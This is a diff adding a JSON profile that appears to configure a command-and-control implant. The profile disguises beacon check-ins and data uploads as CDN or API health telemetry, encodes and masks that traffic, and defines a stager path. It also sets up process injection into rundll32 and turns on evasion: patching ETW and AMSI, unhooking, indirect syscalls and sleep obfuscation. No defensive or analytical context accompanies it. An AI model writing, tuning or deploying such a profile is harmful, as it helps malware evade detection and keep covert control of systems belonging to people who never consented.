@@ -1,0 +1,85 @@
+{
+  "name": "default-46d00699fcb08b79",
+  "description": "Generic CDN/API telemetry mimicry with JSON wire transforms",
+  "sleep_time": 60,
+  "jitter": 20,
+  "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
+  "http_get": {
+    "uri": [
+      "/api/v1/checkin/health",
+      "/cdn/status/data/token/00c723",
+      "/assets/health/sync"
+    ],
+    "verb": "GET",
+    "headers": {
+      "Accept": "application/json, text/plain, */*",
+      "Accept-Language": "en-US,en;q=0.9",
+      "Cache-Control": "no-cache"
+    },
+    "body": {
+      "parameter": "token",
+      "base64": true,
+      "mask": true
+    },
+    "server_output": {
+      "base64": true,
+      "headers": {
+        "Content-Type": "application/json",
+        "Cache-Control": "no-cache"
+      }
+    }
+  },
+  "http_post": {
+    "uri": [
+      "/api/v1/register/verify/trace/f6f2fb5c",
+      "/api/v1/result/v3/client/b97f676",
+      "/api/v1/tunnel/v2"
+    ],
+    "verb": "POST",
+    "headers": {
+      "Content-Type": "application/json;q=10/10",
+      "Accept": "*/*"
+    },
+    "body": {
+      "base64": true,
+      "mask": true,
+      "prepend": "<!-- ",
+      "append": ");",
+      "mask_key": 194
+    },
+    "server_output": {
+      "base64": true,
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "prepend": "callback(",
+      "append": " -->",
+      "mask_key": 194
+    }
+  },
+  "http_stager": {
+    "uri": [
+      "/api/v1/stage/status",
+      "/cdn/pkg/status"
+    ],
+    "verb": "GET"
+  },
+  "spawn_to": {
+    "x86": "%windir%\\SysWOW64\\rundll32.exe",
+    "x64": "%windir%\\System32\\rundll32.exe"
+  },
+  "process_inject": {
+    "alloc_type": "NtMapViewOfSection",
+    "execute_type": "NtQueueApcThread",
+    "use_syscalls": true
+  },
+  "evasion": {
+    "patch_etw": true,
+    "patch_amsi": true,
+    "unhook_on_load": true,
+    "heap_encrypt": true,
+    "syscall_method": "indirect",
+    "sleep_technique": "ekko",
+    "anti_analysis": false
+  }
+}
